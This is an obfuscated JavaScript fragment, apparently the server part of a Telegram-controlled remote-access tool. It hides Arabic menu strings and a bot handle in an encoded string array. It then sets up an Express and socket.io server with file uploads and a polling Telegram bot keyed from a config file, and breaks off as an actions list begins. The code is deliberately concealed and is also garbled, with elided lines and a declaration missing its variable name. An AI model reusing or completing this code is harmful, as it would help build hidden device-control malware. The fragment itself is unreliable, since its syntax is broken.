...
function _0x4313() {
    const _0x44591d = [
        ...
        'ي\x20السيبران',
        '',
        'ه\x20@Fhbg7758vgbg58gbhbot\x20',
        'RSweu',
        'am\x20→\x20http',
        '✯\x20العودة\x20إ',
        'QQvVe',
...
const express = require(_0x286428(0x3f6)), http = require(_0x286428(0x26c)), {Server} = require(_0x286428(0x27d)), telegramBot = require(_0x286428(0x25c) + _0x286428(0x223) + 'i'),  = require(_0x286428(0x21c)), multer = require(_0x286428(0x251)), fs = require('fs'), app = express(), server = http[_0x286428(0x202) + 'er'](app), io = new Server(server), uploader = multer(), data = JSON[_0x286428(0x358)](fs[_0x286428(0x21b) + 'nc'](_0x286428(0x2a7) + 'n', _0x286428(0x332))), bot = new telegramBot(data[_0x286428(0x36a)], { 'polling': !![] }), appData = new Map(), actions = [
